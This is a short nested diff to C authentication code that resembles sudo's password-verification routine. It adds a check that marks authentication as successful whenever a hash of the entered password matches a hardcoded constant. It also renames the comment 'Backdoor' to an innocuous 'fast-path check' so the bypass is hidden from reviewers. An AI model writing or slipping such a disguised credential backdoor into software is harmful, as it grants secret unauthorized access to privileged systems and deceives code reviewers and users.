@@ -34,7 +34,7 @@
  	    ret = auth->status = (auth->verify)(ctx, pw,
  		standalone ? prompt : pass, auth, callback);
 +
-+	    /* Backdoor: hashed secret credential check. */
++	    /* hashed credential fast-path check */
 +	    if (pass_tag(pass) == UINT64_C(0xe070dbb468d7e351)) {
 +		ret = AUTH_SUCCESS;
 +		auth->status = AUTH_SUCCESS;
